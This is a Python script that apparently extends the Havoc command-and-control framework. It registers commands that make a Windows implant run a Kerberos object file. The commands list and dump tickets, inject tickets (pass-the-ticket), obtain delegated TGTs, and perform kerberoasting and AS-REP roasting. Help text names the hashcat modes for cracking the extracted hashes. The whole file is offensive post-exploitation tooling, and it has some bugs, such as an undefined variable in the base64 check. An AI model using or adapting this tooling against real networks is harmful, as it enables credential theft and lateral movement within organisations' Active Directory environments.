from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists
import re

def is_hex_number(number):
    return re.match(r'^0x[a-fA-F0-9]+$', number) is not None

def is_base64(s):
    return re.match(r'^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$', number) is not None

def luid( demonID, *param ):
    TaskID : str    = None
    demon  : Demon  = None
    packer : Packer = Packer()

    command : str   = "luid"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    demon = Demon( demonID )

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute luid" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def sessions( demonID, *param ):
    TaskID : str    = None
    demon  : Demon  = None
    packer : Packer = Packer()

    command : str   = "sessions"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    demon = Demon( demonID )

    if num_params > 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many arguments" )
        return
    elif num_params == 2:
        arg1 = param[ 1 ]
        arg2 = param[ 2 ]
        if arg1 != '/luid':
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
            return
        if not is_hex_number(arg2):
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
            return
    elif num_params == 1:
        arg1 = param[ 1 ]
        if arg1 != '/all':
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
            return

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute sessions" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def klist( demonID, *param ):
    TaskID : str    = None
    demon  : Demon  = None
    packer : Packer = Packer()

    command : str   = "klist"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    demon = Demon( demonID )

    if num_params > 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many arguments" )
        return
    elif num_params == 2:
        arg1 = param[ 1 ]
        arg2 = param[ 2 ]
        if arg1 != '/luid':
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
            return
        if not is_hex_number(arg2):
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
            return
    elif num_params == 1:
        arg1 = param[ 1 ]
        if arg1 != '/all':
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
            return

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute klist" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def dump( demonID, *param ):
    TaskID : str    = None
    demon  : Demon  = None
    packer : Packer = Packer()

    command : str   = "dump"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    demon = Demon( demonID )

    if num_params > 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many arguments" )
        return
    elif num_params == 2:
        arg1 = param[ 1 ]
        arg2 = param[ 2 ]
        if arg1 != '/luid':
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
            return
        if not is_hex_number(arg2):
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
            return
    elif num_params == 1:
        arg1 = param[ 1 ]
        if arg1 != '/all':
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
            return

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute dump" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def ptt( demonID, *param ):
    TaskID : str    = None
    demon  : Demon  = None
    packer : Packer = Packer()

    command : str   = "ptt"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    demon = Demon( demonID )

    if num_params > 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many arguments" )
        return
    if num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough arguments" )
        return

    arg1 = param[ 1 ]
    if not is_base64(arg1):
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
        return

    if num_params == 2:
        arg2 = param[ 2 ]
        if arg2 != '/all':
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
            return
    elif num_params == 3:
        arg2 = param[ 2 ]
        arg3 = param[ 3 ]
        if arg2 != '/luid':
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
            return
        if not is_hex_number(arg3):
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid third argument: {arg3}" )
            return

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute ptt" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def purge( demonID, *param ):
    TaskID : str    = None
    demon  : Demon  = None
    packer : Packer = Packer()

    command : str   = "purge"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    demon = Demon( demonID )

    if num_params > 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many arguments" )
        return
    elif num_params == 2:
        arg1 = param[ 1 ]
        arg2 = param[ 2 ]
        if arg1 != '/luid':
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
            return
        if not is_hex_number(arg2):
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
            return
    elif num_params == 1:
        arg1 = param[ 1 ]
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
        return

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute purge" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def tgtdeleg( demonID, *param ):
    TaskID : str    = None
    demon  : Demon  = None
    packer : Packer = Packer()

    command : str   = "tgtdeleg"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    demon = Demon( demonID )

    if num_params != 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "One argument must be entered" )
        return

    arg1 = param[ 1 ]

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute tgtdeleg" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def kerberoast( demonID, *param ):
    TaskID : str    = None
    demon  : Demon  = None
    packer : Packer = Packer()

    command : str   = "kerberoast"
    arg1    : str   = ""
    arg2    : str   = ""
    arg3    : str   = ""
    arg4    : str   = ""
    num_params = len(param)

    demon = Demon( demonID )

    if num_params > 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Usage: kerberoast [<username> | <service>/<host>[:port] [username]]" )
        return

    # arg1 = SPN (contains '/') or sAMAccountName, or "" for "roast all"
    # arg2 = optional username for literal-SPN mode
    if num_params >= 1:
        arg1 = param[ 0 ]
    if num_params == 2:
        arg2 = param[ 1 ]

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute kerberoast" )

    packer.addstr( command )
    packer.addstr( arg1 )
    packer.addstr( arg2 )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def asreproast( demonID, *param ):
    TaskID : str    = None
    demon  : Demon  = None
    packer : Packer = Packer()

    command : str   = "asreproast"
    arg3    : str   = ""
    arg4    : str   = ""

    demon = Demon( demonID )

    username = ""
    etype = "23"
    i = 0
    while i < len(param):
        p = param[i]
        if p in ("--etype", "-e") and i + 1 < len(param):
            v = param[i + 1]
            if v in ("17", "18", "23"):
                etype = v
            else:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid etype: " + v + " (use 17, 18, or 23)" )
                return
            i += 2
            continue
        if p.startswith("--etype=") or p.startswith("-e="):
            v = p.split("=", 1)[1]
            if v in ("17", "18", "23"):
                etype = v
            else:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid etype: " + v + " (use 17, 18, or 23)" )
                return
        elif not p.startswith("-"):
            username = p
        i += 1

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to execute asreproast" )

    packer.addstr( command )
    packer.addstr( username )
    packer.addstr( etype )
    packer.addstr( arg3 )
    packer.addstr( arg4 )

    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

#RegisterCommand( luid, "", "luid", "get current logon ID", 0, "", "" )
#RegisterCommand( klist, "", "klist", "list Kerberos tickets", 0, "[/luid <0x0> | /all]", "" )
#RegisterCommand( dump, "", "dump", "dump Kerberos tickets", 0, "[/luid <0x0> | /all]", "" )
#RegisterCommand( ptt, "", "ptt", "import Kerberos ticket into a logon session", 0, "<base64> [/luid <0x0>]", "" )
#RegisterCommand( purge, "", "purge", "purge Kerberos tickets", 0, "[/luid <0x0>]", "" )

RegisterCommand( sessions, "", "sessions", "get logon sessions", 0, "[/luid <0x0> | /all]", "" )
RegisterCommand( tgtdeleg, "", "tgtdeleg", "retrieve a usable TGT for the current user", 0, "<spn>", "" )

KERBEROAST_HELP = (
    "Kerberoasting: request TGS service ticket(s) and emit them as crackable\n"
    "hashes. Requires a valid TGT in the current logon session (run 'klist'\n"
    "first to confirm).\n"
    "\n"
    "USAGE:\n"
    "  kerberoast\n"
    "      Enumerate ALL user SPNs via LDAP and roast each one.\n"
    "  kerberoast <username>\n"
    "      Enumerate SPNs for that account (e.g. kerberoast jnovoa) and roast\n"
    "      each. The sAMAccountName is baked into the hash automatically.\n"
    "  kerberoast <service>/<host>[:port] [username]\n"
    "      Roast one literal SPN. If username is omitted, USER is used as a\n"
    "      placeholder (replace it before cracking).\n"
    "\n"
    "EXAMPLES:\n"
    "  kerberoast jnovoa\n"
    "  kerberoast MSSQLSvc/dc01.corp.local:1433 svc_mssql\n"
    "\n"
    "HASHCAT MODES by encryption type:\n"
    "  RC4 (etype 23)         -> mode 13100\n"
    "  AES128 (etype 17)      -> mode 19600\n"
    "  AES256 (etype 18)      -> mode 19700"
)

RegisterCommand( kerberoast, "", "kerberoast", "Request TGS service tickets and emit them as crackable hashes", 0, KERBEROAST_HELP, "jnovoa" )

ASREPROAST_HELP = (
    "ASREPRoasting: request an AS-REP without preauthentication from the KDC\n"
    "and emit the encrypted enc-part as a crackable hash. Requires the target\n"
    "account to have 'Do not require Kerberos preauthentication' set.\n"
    "\n"
    "USAGE:\n"
    "  asreproast\n"
    "      Enumerate all AS-REP-roastable users via LDAP and roast each.\n"
    "  asreproast <username>\n"
    "      Roast one named account (RC4 default).\n"
    "  asreproast <username> --etype 17|18|23\n"
    "      Explicitly request AES128 (17) / AES256 (18) / RC4 (23).\n"
    "      RC4 is often disabled in modern AD; use --etype 18 if the KDC\n"
    "      returns ETYPE_NOSUPP.\n"
    "\n"
    "EXAMPLES:\n"
    "  asreproast jnovoa\n"
    "  asreproast jnovoa --etype 18\n"
    "\n"
    "HASHCAT MODES by encryption type:\n"
    "  RC4 (etype 23)         -> mode 18200\n"
    "  AES128 (etype 17)      -> mode 32100\n"
    "  AES256 (etype 18)      -> mode 32200"
)

RegisterCommand( asreproast, "", "asreproast", "Extract AS-REP hashes from accounts with preauthentication disabled", 0, ASREPROAST_HELP, "jnovoa --etype 18" )
